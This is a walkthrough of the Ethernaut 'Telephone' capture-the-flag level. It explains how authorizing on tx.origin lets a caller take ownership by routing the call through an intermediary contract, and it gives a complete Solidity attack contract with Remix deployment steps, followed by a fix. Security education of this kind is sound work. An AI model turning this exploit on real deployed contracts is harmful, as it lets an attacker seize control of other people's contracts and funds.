# Ethernaut — Telephone (Level) — What the bug was + how to solve it

## What the level is about
This level teaches a **classic Solidity security mistake**: using `tx.origin` for authorization logic.

The contract tries to prevent direct calls by doing this check:

- `tx.origin` = the **original EOA** (your wallet) that started the transaction
- `msg.sender` = the **immediate caller** of the function

The contract assumes that if `tx.origin != msg.sender`, then something “special” is happening and it allows changing the owner.

But that’s exactly what an attacker wants: **call the function through an intermediate contract** so that:

- `tx.origin` = your wallet
- `msg.sender` = your attack contract  
➡️ They are different → the condition passes → you can set yourself as owner.

---

## The real vulnerability (the flaw)

The vulnerability is this line:

```solidity
if (tx.origin != msg.sender) {
    owner = _owner;
}
```

### Why it’s insecure
- `tx.origin` always points to the wallet that initiated the transaction.
- If you call the target through **any smart contract**, then `msg.sender` becomes that contract.
- So `tx.origin != msg.sender` becomes **true** almost automatically when using a proxy/attack contract.

This means **anyone** can become the owner by calling `changeOwner()` via a contract.

---

## Why we use Remix for this level
We use **Remix** because:
- The exploit requires deploying a small helper contract.
- The whole point is to make the call come from a contract (so `msg.sender` changes).
- Remix is the fastest way to:
  - paste the attack contract
  - deploy it with the level instance address
  - call the attack function

---

## Attacking smart contract (to deploy in Remix)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone public target;

    constructor(address _target) {
        target = ITelephone(_target);
    }

    function attack() public {
        // msg.sender here is your wallet (EOA) calling attack()
        // so we forward your address as the new owner
        target.changeOwner(msg.sender);
    }
}
```

---

## How to use it (step-by-step)

1) Open the Ethernaut level **Telephone** and copy your instance address  
2) In Remix:
   - create a file `TelephoneAttack.sol`
   - paste the code above
3) Deploy `TelephoneAttack` with the Telephone instance address as constructor param  
4) Call `attack()` from your wallet  
5) Go back to the Telephone contract and check:

```solidity
owner()
```

It should now be **your address**.

---

## What’s happening under the hood (important)

When you call:

- Wallet (EOA) → `TelephoneAttack.attack()` → `Telephone.changeOwner(...)`

Then inside `Telephone.changeOwner()`:

- `tx.origin` = your wallet address
- `msg.sender` = the `TelephoneAttack` contract address

So:

- `tx.origin != msg.sender` ✅ true  
➡️ `owner = _owner` is executed ✅

---

## Summary

- The contract uses `tx.origin` incorrectly for logic/authorization.
- Calling through an intermediate contract makes `tx.origin` and `msg.sender` different.
- You exploit this by deploying a contract that forwards the call to `changeOwner()`.

Lesson: **Never use `tx.origin` for authentication.** Use `msg.sender` instead.

---
## Bonus: the proper fix (how it should be written)

```solidity
function changeOwner(address _owner) public {
    // Example: restrict to current owner (or any intended auth)
    require(msg.sender == owner, "not owner");
    owner = _owner;
}
```
